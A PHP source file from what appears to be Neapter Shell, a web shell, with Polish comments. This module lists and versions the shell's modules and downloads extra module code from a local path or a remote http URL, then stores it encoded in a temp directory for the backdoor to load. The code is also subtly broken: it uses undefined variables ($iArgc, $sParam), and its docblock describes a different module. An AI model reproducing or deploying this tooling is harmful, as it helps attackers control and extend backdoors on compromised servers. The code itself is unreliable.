<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleModules extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('modules');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
modules - Informacje o modułach

    Użycie:
        modules loaded - lista załadowanych modułów - polecenia
        modules version - wyświetlanie wersji modułów

        modules ścieżka_do_pliku_z_modułami

    Przykład:
        modules loaded
        modules version
        modules /tmp/modules
        modules http://example.com/modules.txt
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {


        /**
         * Lista dostepnych modulow
         */
        if (($iArgc === 1) && ($sParam === 'loaded')) {
            $aModules = $this->oUtils->getModules();

            return sprintf("Załadowano %s modułów:\r\n    %s", count($aModules), implode("\r\n    ", $aModules));
        }

        /**
         * Wyswietlanie wersji bibliotek
         */
        if (($iArgc === 1) && ($sParam === 'version')) {
            /**
             * Szukanie najdluzszej nazwy modulu
             */
            $iMaxLen = 0;
            foreach ($this->aHelpModules as $sModule => $sModuleCmd) {
                if (($iLen = strlen($sModule)) > $iMaxLen) {
                    $iMaxLen = $iLen;
                }
            }

            /**
             * Wersja modulu
             */
            $sOutput = NULL;
            foreach ($this->aHelpModules as $sModule => $sModuleCmd) {
                $oModule = new $sModule($this);

                $sOutput .= str_pad($sModule, $iMaxLen, ' ') . ' - ' . $oModule->getVersion() . "\r\n";
            }

            return htmlspecialchars($sOutput);
        }

        /**
         * Pobieranie pliku z http
         */
        if (strncmp($sParam, 'http://', 7) === 0) {
            if (($sData = file_get_contents($sParam)) === FALSE) {
                return 'Nie można pobrać pliku z modułami';
            }
        } /**
         * Wczytywanie pliku
         */
        else {
            if (!(is_file($sParam) && (($sData = file_get_contents($sParam)) !== FALSE))) {
                return 'Nie można wczytać pliku z modułami';
            }
        }

        /**
         * Szyfrowanie zawartosci pliku
         */
        file_put_contents($this->sTmp . '/' . $this->sPrefix . '_modules', $this->encode($sData));

        header('Refresh:1;url=' . Request::getCurrentUrl());

        return 'Plik z modułami został załadowany';
    }

}
